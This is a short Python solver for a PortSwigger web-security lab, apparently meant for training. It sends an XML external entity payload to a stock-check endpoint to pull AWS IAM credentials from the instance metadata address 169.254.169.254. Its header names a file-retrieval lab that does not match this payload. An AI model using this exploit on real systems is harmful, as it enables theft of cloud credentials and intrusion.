#!/usr/bin/env python3
# Lab: Exploiting XXE using external entities to retrieve files
# Lab-Link: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    print(f'[ ] Attempt to exfiltrate secret access key')
    url = f'{host}/product/stock'
    data = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxx [ <!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&file;</productId><storeId>1</storeId></stockCheck>"""
    if 'SecretAccessKey' not in client.post(url, data=data).text:
        print(f'[-] Response does not appear to contain secret access key')
        sys.exit(-2)
    print(f'[+] Response appears to contain secret access key')

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to solve lab')
        sys.exit(-4)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()